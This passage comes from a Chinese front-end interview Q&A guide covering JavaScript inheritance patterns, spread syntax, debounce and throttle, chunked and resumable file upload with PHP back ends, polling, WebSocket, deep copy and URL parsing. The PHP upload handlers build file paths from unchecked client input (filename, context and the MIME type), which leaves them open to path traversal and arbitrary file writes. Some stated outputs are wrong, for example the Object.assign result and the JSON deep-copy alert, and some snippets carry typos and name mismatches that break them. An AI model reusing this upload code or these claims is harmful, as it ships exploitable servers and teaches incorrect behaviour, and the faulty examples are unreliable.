   原理：子类实例child的`__proto__`指向Child的原型链prototype，而Child.prototype指向Parent类的对象实例，该父类对象实例的`__proto__`指向Parent.prototype,所以Child可继承Parent的构造函数属性、方法和原型链属性、方法
   优点：可继承构造函数的属性，父类构造函数的属性，父类原型的属性
   缺点：无法向父类构造函数传参；且所有实例共享父类实例的属性，若父类共有属性为引用类型，一个子类实例更改父类构造函数共有属性时会导致继承的共有属性发生变化；实例如下：

   ```js
   var a = new Child();
   var b = new Child();
   a.list.push('b');
   console.log(b.list); // ['a','b']
   ```

2. 构造函数继承

   实现方式：在子类构造函数中使用call或者apply劫持父类构造函数方法，并传入参数

   ```js
   function Parent(name, id){
     this.id = id;
     this.name = name;
     this.printName = function(){
       console.log(this.name);
     }
   }
   Parent.prototype.sayName = function(){
     console.log(this.name);
   };
   function Child(name, id){
     Parent.call(this, name, id);
     // Parent.apply(this, arguments);
   }
   var child = new Child("jin", "1");
   child.printName(); // jin
   child.sayName() // Error
   ```

   原理：使用call或者apply更改子类函数的作用域，使this执行父类构造函数，子类因此可以继承父类共有属性
   优点：可解决原型链继承的缺点
   缺点：不可继承父类的原型链方法，构造函数不可复用

3. 组合继承

   原理：综合使用构造函数继承和原型链继承

   ```js
   function Parent(name, id){
     this.id = id;
     this.name = name;
     this.list = ['a'];
     this.printName = function(){
       console.log(this.name);
     }
   }
   Parent.prototype.sayName = function(){
     console.log(this.name);
   };
   function Child(name, id){
     Parent.call(this, name, id);
     // Parent.apply(this, arguments);
   }
   Child.prototype = new Parent();
   var child = new Child("jin", "1");
   child.printName(); // jin
   child.sayName() // jin
   
   var a = new Child();
   var b = new Child();
   a.list.push('b');
   console.log(b.list); // ['a']
   ```

   优点：可继承父类原型上的属性，且可传参；每个新实例引入的构造函数是私有的
   缺点：会执行两次父类的构造函数，消耗较大内存，子类的构造函数会代替原型上的那个父类构造函数

4. 原型式继承

   原理：类似Object.create，用一个函数包装一个对象，然后返回这个函数的调用，这个函数就变成了个可以随意增添属性的实例或对象，结果是将子对象的`__proto__`指向父对象

   ```js
   var parent = {
     names: ['a']
   }
   function copy(object) {
     function F() {}
     F.prototype = object;    
     return new F();
   }
   var child = copy(parent);
   ```

   缺点：共享引用类型

5. 寄生式继承

   原理：二次封装原型式继承，并拓展

   ```js
   function createObject(obj) {
     var o = copy(obj);
     o.getNames = function() {
       console.log(this.names);
       return this.names;
     }
     return o;
   }
   ```

   优点：可添加新的属性和方法

6. 寄生组合式继承

   原理：改进组合继承，利用寄生式继承的思想继承原型

   ```js
   function inheritPrototype(subClass, superClass) {
     // 复制一份父类的原型
     var p = copy(superClass.prototype);
     // 修正构造函数
     p.constructor = subClass;
     // 设置子类原型
     subClass.prototype = p;
   }
   
   function Parent(name, id){
     this.id = id;
     this.name = name;
     this.list = ['a'];
     this.printName = function(){
       console.log(this.name);
     }
   }
   Parent.prototype.sayName = function(){
     console.log(this.name);
   };
   function Child(name, id){
     Parent.call(this, name, id);
     // Parent.apply(this, arguments);
   }
   inheritPrototype(Child, Parent);
   ```



![](https://static.nowcoder.com/images/activity/2021jxy/front/images/16cc75d62ddf654f.png)



### 38、ES6继承



```js
class Parent {
  constructor() {
    this.name = "kif";
    this.age = 12;
  }
}
class Child extends Parent {
  constructor(id) {
    super();
    this.id = id;
  }
}

let p = new Child();
console.log(p.name);
```



![](https://static.nowcoder.com/images/activity/2021jxy/front/images/16cc75d62ddf654f11.png)



### 39、扩展操作符...

**适用类型**：数组、对象、字符串。

复杂数据类型都可以，当要转化为可迭代数据结构时可设置对象的迭代器对扩展运算符扩展出来的值进行操作。

基础数据只有string可以使用扩展运算符，number,boolean,null,undefined无效



**扩展运算符的应用场景**

```js
// 1、函数调用
function add(x, y) {
  return x + y;
}
add(...[4, 38]);

function f(v, w, x, y, z) {  }
f(-1, ...[0, 1], 2, ...[3]);
// 123456789

//2.往数组里push多个元素
var arr1 = [0, 1, 2];
var arr2 = [3, 4, 5];
arr1.push(...arr2);  
console.log(arr1); //[0,1,2,3,4,5]
//123456

//3.替代函数的apply方法
function f(x, y, z) {  }  
var args = [0, 1, 2];
f.apply(null, args); //ES5 的写法
f(...args); //ES6的写法
// 123456

//4.求一个数组的最大数简化
Math.max.apply(null, [14, 3, 77])  //ES5 的写法
Math.max(...[14, 3, 77])  //ES6 的写法，等同于Math.max(14, 3, 77)
//1234

//5.扩展运算符后面可以放表达式
const arr = [...(5 > 0 ? ['a'] : []),'b'];
console.log(arr);  //['a','b'] 
//1234

//6.与解构赋值结合，用于生成数组
const a1 = [1, 2];
const a2 = [...a1];  //写法1
const [...a2] = a1;  //写法2
const [first, ...rest] = [1, 2, 3, 4, 5];
first  //1
rest  //[2, 3, 4, 5]

const [first, ...rest] = [];
first  //undefined
rest  //[]

const [first, ...rest] = ["foo"];
first  //"foo"
rest   //[]
//1234567891011121314151617

//7.合并数组
[...arr1, ...arr2, ...arr3]  //[ 'a', 'b', 'c', 'd', 'e' ]


//8.数组的克隆——————————————————————特别注意
var arr1 = [0, 1, 2];
var arr2 = [...arr1];
arr1[0]=100;
console.log(arr2); //[0, 1, 2]  

/* 乍一看，arr2与arr1不共用引用地址，arr2不随着arr1变化，接着往下看 */

var arr1 = [0, [1,11,111], 2];
var arr2 = [...arr1];
arr1[1][0]=100;
console.log(arr2); //[0, [100,11,111], 2]
```

### 40、为什么js是单线程

**参考答案：**

这主要和js的用途有关，js是作为浏览器的脚本语言，主要是实现用户与浏览器的交互，以及操作dom；这决定了它只能是单线程，否则会带来很复杂的同步问题。 举个例子：如果js被设计了多线程，如果有一个线程要修改一个dom元素，另一个线程要删除这个dom元素，此时浏览器就会一脸茫然，不知所措。所以，为了避免复杂性，从一诞生，JavaScript就是单线程，这已经成了这门语言的核心特征，将来也不会改变

**扩展：**

什么是进程？

进程：是cpu分配资源的最小单位；（是能拥有资源和独立运行的最小单位）

什么是线程？

线程：是cpu调度的最小单位；（线程是建立在进程的基础上的一次程序运行单位，一个进程中可以有多个线程）

浏览器是多进程的？

放在浏览器中，每打开一个tab页面，其实就是新开了一个进程，在这个进程中，还有ui渲染线程，js引擎线程，http请求线程等。 所以，浏览器是一个多进程的。

为了利用多核CPU的计算能力，HTML5提出Web Worker标准，允许JavaScript脚本创建多个线程，但是子线程完全受主线程控制，且不得操作DOM。所以，这个新标准并没有改变JavaScript单线程的本质。



### 41、死锁

**参考答案：**

死锁是指两个或两个以上的进程在执行过程中，由于竞争资源而造成阻塞的现象，若无外力作用，它们都将无法继续执行

产生原因

- 竞争资源引起进程死锁
- 可剥夺和非剥夺资源
- 竞争非剥夺资源
- 竞争临时性资源
- 进程推进顺序不当

产生条件

1. 互斥条件：涉及的资源是非共享的
   - 涉及的资源是非共享的,一段时间内某资源只由一个进程占用,如果此时还有其它进程请求资源，则请求者只能等待，直至占有资源的进程用毕释放
2. 不剥夺条件：不能强行剥夺进程拥有的资源
   - 进程已获得的资源，在未使用完之前，不能被剥夺，只能在使用完时由自己释放
3. 请求和保持条件：进程在等待一新资源时继续占有已分配的资源
   - 指进程已经保持至少一个资源，但又提出了新的资源请求，而该资源已被其它进程占有，此时请求进程阻塞，但又对自己已获得的其它资源保持不放 
4. 环路等待条件：存在一种进程的循环链，链中的每一个进程已获得的资源同时被链中的下一个进程所请求 在发生死锁时，必然存在一个进程——资源的环形链

解决办法

只要打破四个必要条件之一就能有效预防死锁的发生



### 42、面向对象的三个特征，分别说一下什么意思

**参考答案：**

概念：

**封装：**将对象运行所需的资源封装在程序对象中——基本上，是方法和数据。对象是“公布其接口”。其他附加到这些接口上的对象不需要关心对象实现的方法即可使用这个对象。这个概念就是“不要告诉我你是怎么做的，只要做就可以了。”对象可以看作是一个自我包含的原子。对象接口包括了公共的方法和初始化数据。

**继承：** 继承可以解决代码复用，让编程更加靠近人类思维。当多个类存在相同的属性(变量)和方法时，可以从这些类中抽象出父类，在父类中定义这些相同的属性和方法，所有的子类不需要重新定义这些属性和方法，只需要通过继承父类中的属性和方法。

**多态：** 多态是指一个引用(类型)在不同情况下的多种状态。也可以理解成：多态是指通过指向父类的引用，来调用在不同子类中实现的方法。

特点：

**封装**可以隐藏实现细节，使得代码模块化；

**继承**可以扩展已存在的代码模块（类），它们的目的都是为了——代码重用。

**多态**就是相同的事物，调用其相同的方法，参数也相同时，但表现的行为却不同。多态分为两种，一种是行为多态与对象的多态





### 43、防抖和节流的原理和使用场景

**参考答案：**

函数防抖和函数节流：优化高频率执行js代码的一种手段，js中的一些事件如浏览器的resize、scroll，鼠标的mousemove、mouseover，input输入框的keypress等事件在触发时，会不断地调用绑定在事件上的回调函数，极大地浪费资源，降低前端性能。为了优化体验，需要对这类事件进行调用次数的限制。

**防抖：**

在事件被触发n秒后再执行回调，如果在这n秒内又被触发，则重新计时。

根据函数防抖思路设计出第一版的最简单的防抖代码：

```
var timer; // 维护同一个timer
function debounce(fn, delay) {
    clearTimeout(timer);
    timer = setTimeout(function(){
        fn();
    }, delay);
}
```

上面例子中的debounce就是防抖函数，在document中鼠标移动的时候，会在onmousemove最后触发的1s后执行回调函数testDebounce；如果我们一直在浏览器中移动鼠标（比如10s），会发现会在10 + 1s后才会执行testDebounce函数（因为clearTimeout(timer)），这个就是函数防抖。

在上面的代码中，会出现一个问题，var timer只能在setTimeout的父级作用域中，这样才是同一个timer，并且为了方便防抖函数的调用和回调函数fn的传参问题，我们应该用闭包来解决这些问题。

优化后的代码：

```js
function debounce(fn, delay) {
    var timer; // 维护一个 timer
    return function () {
        var _this = this; // 取debounce执行作用域的this
        var args = arguments;
        if (timer) {
            clearTimeout(timer);
        }
        timer = setTimeout(function () {
            fn.apply(_this, args); // 用apply指向调用debounce的对象，相当于_this.fn(args);
        }, delay);
    };
}
```

使用闭包后，解决传参和封装防抖函数的问题，这样就可以在其他地方随便将需要防抖的函数传入debounce了。

**节流：**

每隔一段时间，只执行一次函数。

- 定时器实现节流函数：

  ```js
  function throttle(fn, delay) {
      var timer;
      return function () {
          var _this = this;
          var args = arguments;
          if (timer) {
              return;
          }
          timer = setTimeout(function () {
              fn.apply(_this, args);
              timer = null; // 在delay后执行完fn之后清空timer，此时timer为假，throttle触发可以进入计时器
          }, delay)
      }
  }
  ```

- 时间戳实现节流函数：

  ```js
  function throttle(fn, delay) {
      var previous = 0;
      // 使用闭包返回一个函数并且用到闭包函数外面的变量previous
      return function() {
          var _this = this;
          var args = arguments;
          var now = new Date();
          if(now - previous > delay) {
              fn.apply(_this, args);
              previous = now;
          }
      }
  }
  ```

**异同比较**

相同点：

- 都可以通过使用 setTimeout 实现。
- 目的都是，降低回调执行频率。节省计算资源。

不同点：

- 函数防抖，在一段连续操作结束后，处理回调，**利用clearTimeout 和 setTimeout实现**。函数节流，在一段连续操作中，**每一段时间只执行一次**，频率较高的事件中使用来提高性能。
- 函数防抖关注一定时间连续触发的事件只在最后执行一次，而函数节流侧重于一段时间内只执行一次。

常见应用场景

**函数防抖的应用场景:**

连续的事件，只需触发一次回调的场景有：

- 搜索框搜索输入。只需用户最后一次输入完，再发送请求
- 手机号、邮箱验证输入检测
- 窗口大小Resize。只需窗口调整完成后，计算窗口大小。防止重复渲染。

函数节流的应用场景:

间隔一段时间执行一次回调的场景有：

- 滚动加载，加载更多或滚到底部监听
- 谷歌搜索框，搜索联想功能
- 高频点击提交，表单重复提交




### 44、文件异步上传怎么实现

**参考答案：**

#### 1.普通表单上传

使用PHP来展示常规的表单上传是一个不错的选择。首先构建文件上传的表单，并指定表单的提交内容类型为`enctype="multipart/form-data"`，表明表单需要上传二进制数据。

```html
<form action="/index.php" method="POST" enctype="multipart/form-data">
  <input type="file" name="myfile">
  <input type="submit">
</form>
```

然后编写`index.php`上传文件接收代码，使用`move_uploaded_file`方法即可(php大法好...)

```js
$imgName = 'IMG'.time().'.'.str_replace('image/','',$_FILES["myfile"]['type']);
$fileName =  'upload/'.$imgName;
// 移动上传文件至指定upload文件夹下，并根据返回值判断操作是否成功
if (move_uploaded_file($_FILES['myfile']['tmp_name'], $fileName)){
    echo $fileName;
}else {
    echo "nonn";
}
```

form表单上传大文件时，很容易遇见服务器超时的问题。通过xhr，前端也可以进行异步上传文件的操作，一般由两个思路。

#### 2.文件编码上传

第一个思路是将文件进行编码，然后在服务端进行解码，之前写过一篇在前端实现图片压缩上传的博客，其主要实现原理就是将图片转换成base64进行传递

```js
var imgURL = URL.createObjectURL(file);
ctx.drawImage(imgURL, 0, 0);
// 获取图片的编码，然后将图片当做是一个很长的字符串进行传递
var data = canvas.toDataURL("image/jpeg", 0.5); 
```

在服务端需要做的事情也比较简单，首先解码base64，然后保存图片即可

```js
$imgData = $_REQUEST['imgData'];
$base64 = explode(',', $imgData)[1];
$img = base64_decode($base64);
$url = './test.jpg';
if (file_put_contents($url, $img)) {
    exit(json_encode(array(
        url => $url
    )));
}
```

base64编码的缺点在于其体积比原图片更大（因为Base64将三个字节转化成四个字节，因此编码后的文本，会比原文本大出三分之一左右），对于体积很大的文件来说，上传和解析的时间会明显增加。

更多关于base64的知识，可以参考Base64笔记。

除了进行base64编码，还可以在前端直接读取文件内容后以二进制格式上传

```js
// 读取二进制文件
function readBinary(text){
   var data = new ArrayBuffer(text.length);
   var ui8a = new Uint8Array(data, 0);
   for (var i = 0; i < text.length; i++){ 
     ui8a[i] = (text.charCodeAt(i) & 0xff);
   }
   console.log(ui8a)
}

var reader = new FileReader();
reader.onload = function(){
    readBinary(this.result) // 读取result或直接上传
}
// 把从input里读取的文件内容，放到fileReader的result字段里
reader.readAsBinaryString(file);
```

#### 3.formData异步上传

FormData对象主要用来组装一组用 XMLHttpRequest发送请求的键/值对，可以更加灵活地发送Ajax请求。可以使用FormData来模拟表单提交。

```js
let files = e.target.files // 获取input的file对象
let formData = new FormData();
formData.append('file', file);
axios.post(url, formData);
```

服务端处理方式与直接form表单请求基本相同。

#### 4.iframe无刷新页面

在低版本的浏览器（如IE）上，xhr是不支持直接上传formdata的，因此只能用form来上传文件，而form提交本身会进行页面跳转，这是因为form表单的[target](https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/form)属性导致的，其取值有

- _self，默认值，在相同的窗口中打开响应页面

- _blank，在新窗口打开

- #### _parent，在父窗口打开

- _top，在最顶层的窗口打开

- `framename`，在指定名字的iframe中打开

如果需要让用户体验异步上传文件的感觉，可以通过`framename`指定iframe来实现。把form的target属性设置为一个看不见的iframe，那么返回的数据就会被这个iframe接受，因此只有该iframe会被刷新，至于返回结果，也可以通过解析这个iframe内的文本来获取。

```js
function upload(){
    var now = +new Date()
    var id = 'frame' + now
    $("body").append(`<iframe style="display:none;" name="${id}" id="${id}" />`);

    var $form = $("#myForm")
    $form.attr({
        "action": '/index.php',
        "method": "post",
        "enctype": "multipart/form-data",
        "encoding": "multipart/form-data",
        "target": id
    }).submit()

    $("#"+id).on("load", function(){
        var content = $(this).contents().find("body").text()
        try{
            var data = JSON.parse(content)
        }catch(e){
            console.log(e)
        }
    })
}
```

**扩展：**

**大文件上传**

现在来看看在上面提到的几种上传方式中实现大文件上传会遇见的超时问题，

- 表单上传和iframe无刷新页面上传，实际上都是通过form标签进行上传文件，这种方式将整个请求完全交给浏览器处理，当上传大文件时，可能会遇见请求超时的情形
- 通过fromData，其实际也是在xhr中封装一组请求参数，用来模拟表单请求，无法避免大文件上传超时的问题
- 编码上传，我们可以比较灵活地控制上传的内容

大文件上传最主要的问题就在于：**在同一个请求中，要上传大量的数据，导致整个过程会比较漫长，且失败后需要重头开始上传**。试想，如果我们将这个请求拆分成多个请求，每个请求的时间就会缩短，且如果某个请求失败，只需要重新发送这一次请求即可，无需从头开始，这样是否可以解决大文件上传的问题呢？

综合上面的问题，看来大文件上传需要实现下面几个需求

- 支持拆分上传请求(即切片)
- 支持断点续传
- 支持显示上传进度和暂停上传

接下来让我们依次实现这些功能，看起来最主要的功能应该就是切片了。

**文件切片**

编码方式上传中，在前端我们只要先获取文件的二进制内容，然后对其内容进行拆分，最后将每个切片上传到服务端即可。

在JavaScript中，文件FIle对象是Blob对象的子类，Blob对象包含一个重要的方法slice，通过这个方法，我们就可以对二进制文件进行拆分。

下面是一个拆分文件的示例

```js
function slice(file, piece = 1024 * 1024 * 5) {
 let totalSize = file.size; // 文件总大小
 let start = 0; // 每次上传的开始字节
 let end = start + piece; // 每次上传的结尾字节
 let chunks = []
 while (start < totalSize) {
 // 根据长度截取每次需要上传的数据
 // File对象继承自Blob对象，因此包含slice方法
 let blob = file.slice(start, end); 
 chunks.push(blob)
 start = end;
 end = start + piece;
 }
 return chunks
}
```

将文件拆分成piece大小的分块，然后每次请求只需要上传这一个部分的分块即可

```js
let file = document.querySelector("[name=file]").files[0];
const LENGTH = 1024 * 1024 * 0.1;
let chunks = slice(file, LENGTH); // 首先拆分切片
chunks.forEach(chunk=>{
 let fd = new FormData();
 fd.append("file", chunk);
 post('/mkblk.php', fd)
})
```

服务器接收到这些切片后，再将他们拼接起来就可以了，下面是PHP拼接切片的示例代码

```js
$filename = './upload/' . $_POST['filename'];//确定上传的文件名
//第一次上传时没有文件，就创建文件，此后上传只需要把数据追加到此文件中
if(!file_exists($filename)){
 move_uploaded_file($_FILES['file']['tmp_name'],$filename);
}else{
 file_put_contents($filename,file_get_contents($_FILES['file']['tmp_name']),FILE_APPEND);
 echo $filename;
}
```

测试时记得修改nginx的server配置，否则大文件可能会提示413 Request Entity Too Large的错误。

```js
server {
  // ...
  client_max_body_size 50m;
}
```

上面这种方式来存在一些问题

- 无法识别一个切片是属于哪一个切片的，当同时发生多个请求时，追加的文件内容会出错
- 切片上传接口是异步的，无法保证服务器接收到的切片是按照请求顺序拼接的

因此接下来我们来看看应该如何在服务端还原切片。

**还原切片**

在后端需要将多个相同文件的切片还原成一个文件，上面这种处理切片的做法存在下面几个问题

- 如何识别多个切片是来自于同一个文件的，这个可以在每个切片请求上传递一个相同文件的context参数
- 如何将多个切片还原成一个文件
- 确认所有切片都已上传，这个可以通过客户端在切片全部上传后调用mkfile接口来通知服务端进行拼接
- 找到同一个context下的所有切片，确认每个切片的顺序，这个可以在每个切片上标记一个位置索引值
- 按顺序拼接切片，还原成文件

上面有一个重要的参数，即context，我们需要获取为一个文件的唯一标识，可以通过下面两种方式获取

- 根据文件名、文件长度等基本信息进行拼接，为了避免多个用户上传相同的文件，可以再额外拼接用户信息如uid等保证唯一性
- 根据文件的二进制内容计算文件的hash，这样只要文件内容不一样，则标识也会不一样，缺点在于计算量比较大.

修改上传代码，增加相关参数

```js
// 获取context，同一个文件会返回相同的值
function createContext(file) {
  return file.name + file.length
}
let file = document.querySelector("[name=file]").files[0];
const LENGTH = 1024 * 1024 * 0.1;
let chunks = slice(file, LENGTH);
// 获取对于同一个文件，获取其的context
let context = createContext(file);
let tasks = [];
chunks.forEach((chunk, index) => {
 let fd = new FormData();
 fd.append("file", chunk);
 // 传递context
 fd.append("context", context);
 // 传递切片索引值
 fd.append("chunk", index + 1);

 tasks.push(post("/mkblk.php", fd));
});
// 所有切片上传完毕后，调用mkfile接口
Promise.all(tasks).then(res => {
 let fd = new FormData();
 fd.append("context", context);
 fd.append("chunks", chunks.length);
 post("/mkfile.php", fd).then(res => {
 console.log(res);
 });
});
```

在mkblk.php接口中，我们通过context来保存同一个文件相关的切片

```js
// mkblk.php
$context = $_POST['context'];
$path = './upload/' . $context;
if(!is_dir($path)){
 mkdir($path);
}
// 把同一个文件的切片放在相同的目录下
$filename = $path .'/'. $_POST['chunk'];
$res = move_uploaded_file($_FILES['file']['tmp_name'],$filename);
```

除了上面这种简单通过目录区分切片的方法之外，还可以将切片信息保存在数据库来进行索引。接下来是mkfile.php接口的实现，这个接口会在所有切片上传后调用

```js
// mkfile.php
$context = $_POST['context'];
$chunks = (int)$_POST['chunks'];
//合并后的文件名
$filename = './upload/' . $context . '/file.jpg'; 
for($i = 1; $i <= $chunks; ++$i){
 $file = './upload/'.$context. '/' .$i; // 读取单个切块
 $content = file_get_contents($file);
 if(!file_exists($filename)){
 $fd = fopen($filename, "w+");
 }else{
 $fd = fopen($filename, "a");
 }
 fwrite($fd, $content); // 将切块合并到一个文件上
}
echo $filename;
```

这样就解决了上面的两个问题：

- 识别切片来源
- 保证切片拼接顺序

**断点续传**

即使将大文件拆分成切片上传，我们仍需等待所有切片上传完毕，在等待过程中，可能发生一系列导致部分切片上传失败的情形，如网络故障、页面关闭等。由于切片未全部上传，因此无法通知服务端合成文件。这种情况下可以通过**断点续传**来进行处理。

断点续传指的是：可以从已经上传部分开始继续上传未完成的部分，而没有必要从头开始上传，节省上传时间。

由于整个上传过程是按切片维度进行的，且mkfile接口是在所有切片上传完成后由客户端主动调用的，因此断点续传的实现也十分简单：

- 在切片上传成功后，保存已上传的切片信息
- 当下次传输相同文件时，遍历切片列表，只选择未上传的切片进行上传
- 所有切片上传完毕后，再调用mkfile接口通知服务端进行文件合并

因此问题就落在了如何保存已上传切片的信息了，保存一般有两种策略

- 可以通过locaStorage等方式保存在前端浏览器中，这种方式不依赖于服务端，实现起来也比较方便，缺点在于如果用户清除了本地文件，会导致上传记录丢失
- 服务端本身知道哪些切片已经上传，因此可以由服务端额外提供一个根据文件context查询已上传切片的接口，在上传文件前调用该文件的历史上传记录

下面让我们通过在本地保存已上传切片记录，来实现断点上传的功能

```js
// 获取已上传切片记录
function getUploadSliceRecord(context){
 let record = localStorage.getItem(context)
 if(!record){
 return []
 }else {
 try{
 return JSON.parse(record)
 }catch(e){}
 }
}
// 保存已上传切片
function saveUploadSliceRecord(context, sliceIndex){
 let list = getUploadSliceRecord(context)
 list.push(sliceIndex)
 localStorage.setItem(context, JSON.stringify(list))
}
```

然后对上传逻辑稍作修改，主要是增加上传前检测是已经上传、上传后保存记录的逻辑

```js
let context = createContext(file);
// 获取上传记录
let record = getUploadSliceRecord(context);
let tasks = [];
chunks.forEach((chunk, index) => {
 // 已上传的切片则不再重新上传
 if(record.includes(index)){
 return
 }

 let fd = new FormData();
 fd.append("file", chunk);
 fd.append("context", context);
 fd.append("chunk", index + 1);
 let task = post("/mkblk.php", fd).then(res=>{
 // 上传成功后保存已上传切片记录
 saveUploadSliceRecord(context, index)
 record.push(index)
 })
 tasks.push(task);
});
```

此时上传时刷新页面或者关闭浏览器，再次上传相同文件时，之前已经上传成功的切片就不会再重新上传了。

服务端实现断点续传的逻辑基本相似，只要在getUploadSliceRecord内部调用服务端的查询接口获取已上传切片的记录即可，因此这里不再展开。

此外断点续传还需要考虑**切片过期**的情况：如果调用了mkfile接口，则磁盘上的切片内容就可以清除掉了，如果客户端一直不调用mkfile的接口，放任这些切片一直保存在磁盘显然是不可靠的，一般情况下，切片上传都有一段时间的有效期，超过该有效期，就会被清除掉。基于上述原因，断点续传也必须同步切片过期的实现逻辑。

**上传进度和暂停**

通过xhr.upload中的progress方法可以实现监控每一个切片上传进度。

上传暂停的实现也比较简单，通过xhr.abort可以取消当前未完成上传切片的上传，实现上传暂停的效果，恢复上传就跟断点续传类似，先获取已上传的切片列表，然后重新发送未上传的切片。

由于篇幅关系，上传进度和暂停的功能这里就先不实现了。

### 45、使用setInterval请求实时数据，返回顺序不一致怎么解决

**参考答案：**

场景：

```js
setInterval(function() {
    $.get("/path/to/server", function(data, status) {
        console.log(data);
    });
}, 10000);
```

上面的程序会每隔10秒向服务器请求一次数据，并在数据到达后存储。这个实现方法通常可以满足简单的需求，然而同时也存在着很大的缺陷：在网络情况不稳定的情况下，服务器从接收请求、发送请求到客户端接收请求的总时间有可能超过10秒，而请求是以10秒间隔发送的，这样会导致接收的数据到达先后顺序与发送顺序不一致。

解决方案：

1. 使用setTimeout代替setInterval

   程序首先设置10秒后发起请求，当数据返回后再隔10秒发起第二次请求，以此类推。这样的话虽然无法保证两次请求之间的时间间隔为固定值，但是可以保证到达数据的顺序。

   ```js
   function poll() {
       setTimeout(function() {
           $.get("/path/to/server", function(data, status) {
               console.log(data);
               // 发起下一次请求
               poll();
           });
       }, 10000);
   }
   ```

2. WebSocket

   WebSocket 协议本质上是一个基于 TCP 的协议。

   为了建立一个 WebSocket 连接，客户端浏览器首先要向服务器发起一个 HTTP 请求，这个请求和通常的 HTTP 请求不同，包含了一些附加头信息，其中附加头信息"Upgrade: WebSocket"表明这是一个申请协议升级的 HTTP 请求，服务器端解析这些附加的头信息然后产生应答信息返回给客户端，客户端和服务器端的 WebSocket 连接就建立起来了，双方就可以通过这个连接通道自由的传递信息，**并且这个连接会持续存在直到客户端或者服务器端的某一方主动的关闭连接。**

   服务器（Node.js）：

   ```js
   var WebSocketServer = require('ws').Server;
   var wss = new WebSocketServer({port: 8080});
   
   wss.on("connection", function(socket) {
       socket.on("message", function(msg) {
           console.log(msg);
           socket.send("Nice to meet you!");
       });
   });
   ```

   客户端同样可以使用Node.js或者是浏览器实现，这里选用浏览器作为客户端：

   ```js
   // WebSocket 为客户端JavaScript的原生对象
   var ws = new WebSocket("ws://localhost:8080");
   ws.onopen = function (event) {
       ws.send("Hello there!");
   }
   ws.onmessage = function (event) {
       console.log(event.data);
   }
   ```



### 46、浅拷贝，深拷贝(实现方式)

**参考答案：**

浅拷贝和深拷贝都只针对于引用数据类型，浅拷贝只复制指向某个对象的指针，而不复制对象本身，新旧对象还是共享同一块内存；但深拷贝会另外创造一个一模一样的对象，新对象跟原对象不共享内存，修改新对象不会改到原对象；

区别：浅拷贝只复制对象的第一层属性、深拷贝可以对对象的属性进行递归复制；

实现浅拷贝方法

（1）Object.assign方法

```js
var obj = {
    a: 1,
    b: 2
}
var obj1 = Object.assign({},obj);
boj1.a = 3;
console.log(obj.a) // 3
```

（2）for in方法

```js
// 只复制第一层的浅拷贝
function simpleCopy(obj1) {
   var obj2 = Array.isArray(obj1) ? [] : {};
   for (let i in obj1) {
   obj2[i] = obj1[i];
  }
   return obj2;
}
var obj1 = {
   a: 1,
   b: 2,
   c: {
         d: 3
      }
}
var obj2 = simpleCopy(obj1);
obj2.a = 3;
obj2.c.d = 4;
alert(obj1.a); // 1
alert(obj2.a); // 3
alert(obj1.c.d); // 4
alert(obj2.c.d); // 4
```

实现深拷贝方法

（1）采用递归去拷贝所有层级属性

```js
function deepClone(obj){
    let objClone = Array.isArray(obj)?[]:{};
    if(obj && typeof obj==="object"){
        for(key in obj){
            if(obj.hasOwnProperty(key)){
                //判断ojb子元素是否为对象，如果是，递归复制
                if(obj[key]&&typeof obj[key] ==="object"){
                    objClone[key] = deepClone(obj[key]);
                }else{
                    //如果不是，简单复制
                    objClone[key] = obj[key];
                }
            }
        }
    }
    return objClone;
}    
let a=[1,2,3,4],
    b=deepClone(a);
a[0]=2;
console.log(a,b);
```

（2）使用JSON.stringify和JSON.parse实现深拷贝：JSON.stringify把对象转成字符串，再用JSON.parse把字符串转成新的对象；

```js
function deepCopy(obj1){
    let _obj = JSON.stringify(obj1);
    let obj2 = JSON.parse(_obj);
    return obj2;
  }
    var a = [1, [1, 2], 3, 4];
    var b = deepCopy(a);
    b[1][0] = 2;
    alert(a); // 1,1,2,3,4
    alert(b); // 2,2,2,3,4
```

（3）热门的函数库lodash，也有提供_.cloneDeep用来做深拷贝；

```js
var _ = require('lodash');
var obj1 = {
    a: 1,
    b: { f: { g: 1 } },
    c: [1, 2, 3]
};
var obj2 = _.cloneDeep(obj1);
console.log(obj1.b.f === obj2.b.f);
// false
```



### 47、获取当前页面url

**参考答案：**

1. window.location.href (设置或获取整个 URL 为字符串)

```js
var test = window.location.href;
alert(test);
//  返回：http://i.cnblogs.com/EditPosts.aspx?opt=1
```

1. window.location.protocol (设置或获取 URL 的协议部分)

```js
var test = window.location.protocol;
alert(test);
//返回：http:
```

1. window.location.host (设置或获取 URL 的主机部分)

```js
var test = window.location.host;
alert(test);
//返回：i.cnblogs.com
```

1. window.location.port (设置或获取与 URL 关联的端口号码)

```js
var test = window.location.port;
alert(test);
//返回：空字符(如果采用默认的80端口 (update:即使添加了:80)，那么返回值并不是默认的80而是空字符)
```

1. window.location.pathname (设置或获取与 URL 的路径部分（就是文件地址）)

```js
var test = window.location.pathname;
alert(test);
//返回：/EditPosts.aspx
```

1. window.location.search (设置或获取 href 属性中跟在问号后面的部分)

```js
var test = window.location.search;
alert(test);
//返回：?opt=1
（PS：获得查询（参数）部分，除了给动态语言赋值以外，我们同样可以给静态页面，并使用javascript来获得相信应的参数值。）
```

1. window.location.hash (设置或获取 href 属性中在井号“#”后面的分段)

```js
var test = window.location.hash;
alert(test);
//返回：空字符(因为url中没有)
```

1. js获取url中的参数值*

   正则法

```js
 function getQueryString(name) {
          var reg = new RegExp('(^|&)' + name + '=([^&]*)(&|$)', 'i');
          var r = window.location.search.substr(1).match(reg);

          if (r != null) {
             return unescape(r[2]);
          }
          return null;
  }
// 这样调用：
alert(GetQueryString("参数名1"));
alert(GetQueryString("参数名2"));
alert(GetQueryString("参数名3"));
```

 split拆分法

```js
function GetRequest() {
         var url = location.search; //获取url中"?"符后的字串
         var theRequest = new Object();

         if (url.indexOf("?") != -1) {
                 var str = url.substr(1);
                 strs = str.split("&");
              for(var i = 0; i < strs.length; i ++) {
                      theRequest[strs[i].split("=")[0]] = unescape(strs[i].split("=")[1]);
               }
         }
     return theRequest;
 }
var Request = new Object();
Request = GetRequest();<br>// var id=Request["id"]; 
// var 参数1,参数2,参数3,参数N;
// 参数1 = Request['参数1'];
// 参数2 = Request['参数2'];
// 参数3 = Request['参数3'];
// 参数N = Request['参数N'];
```

 指定取
比如说一个url：[http://i.cnblogs.com/?j=js](https://link.jianshu.com/?t=http://i.cnblogs.com/?j=js), 我们想得到参数j的值，可以通过以下函数调用。

```js
function GetQueryString(name) { 
         var reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)", "i"); 
         var r = window.location.search.substr(1).match(reg); //获取url中"?"符后的字符串并正则匹配
         var context = ""; 

